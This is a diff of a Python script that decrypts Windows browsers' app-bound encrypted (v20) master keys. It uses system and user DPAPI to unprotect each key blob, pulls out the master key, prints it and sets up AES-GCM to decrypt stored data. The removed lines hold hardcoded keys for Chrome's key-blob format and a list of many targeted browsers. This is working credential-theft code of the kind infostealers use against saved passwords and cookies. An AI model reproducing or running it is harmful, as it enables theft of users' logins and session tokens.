@@ -18,15 +18,7 @@ from contextlib import contextmanager
 import windows
 import windows.crypto
 import windows.generated_def as gdef
-from cryptography.hazmat.primitives.ciphers.aead import AESGCM, ChaCha20Poly1305
-
-# Fixed keys for Chrome-style v20 key blob decryption
-CHROME_FIXED_AES_KEY = bytes.fromhex(
-    "B31C6E241AC846728DA9C1FAC4936651CFFB944D143AB816276BCC6DA0284787")
-CHROME_FIXED_CHACHA_KEY = bytes.fromhex(
-    "E98F37D7F4E1FA433D19304DC2258042090E2D1D7EEA7670D41F738D08729660")
-ABE_XOR_KEY = bytes.fromhex(
-    "CCF8A1CEC56605B8517552BA1A2D061C03A29E90274FB2FCF59BA4B75C392390")
+from cryptography.hazmat.primitives.ciphers.aead import AESGCM
 
 # ---------------------------------------------------------------------------
 # Browser registry: (data_dir_relative, local_state_relative, key_name, process)
@@ -396,31 +388,16 @@ def main():
         user_dec = windows.crypto.dpapi.unprotect(sys_dec)
         print(f"  user_dec length: {len(user_dec)} bytes")
 
-        # Step 3: Extract v20 master key from user_dec
-        # Chrome uses parse_key_blob + derive_chrome_v20_key (flag-based structure)
-        # Edge uses extract_master_key (header_len + raw key structure)
+        # Step 3: Extract master key from user_dec (Edge-style simple structure)
         print("[3/4] Extracting v20 master key...")
-        v20_cipher = None
-        is_chrome_style = bname in ("chrome", "chromium", "ungoogled", "360", "360x",
-                                   "qq", "sogou", "liebao", "2345", "maxthon", "slimjet",
-                                   "coccoc", "arc", "yandex", "brave")
         try:
-            if is_chrome_style:
-                # Chrome-style: header_len(4)+header+content_len(4)+flag(1)+data
-                parsed = parse_key_blob(user_dec)
-                flag = parsed['flag']
-                print(f"  flag={flag}")
-                master_key = derive_chrome_v20_key(parsed, cng_key_name)
-                print(f"  Master key: {master_key.hex()}")
-                v20_cipher = AESGCM(master_key)
-            else:
-                # Edge-style: header_len(4)+header+content_len(4)+raw_master_key
-                master_key, header_len, content_len = extract_master_key(user_dec)
-                print(f"  header_len: {header_len}, content_len: {content_len}")
-                print(f"  Master key: {master_key.hex()}")
-                v20_cipher = AESGCM(master_key)
+            master_key, header_len, content_len = extract_master_key(user_dec)
+            print(f"  header_len: {header_len}, content_len: {content_len}")
+            print(f"  Master key: {master_key.hex()}")
+            v20_cipher = AESGCM(master_key)
         except Exception as e:
             print(f"  v20 key extraction failed: {e}")
+            v20_cipher = None
     else:
         print("[SKIP] No app_bound_encrypted_key (ABE/v20 not supported by this browser)")
         v20_cipher = None
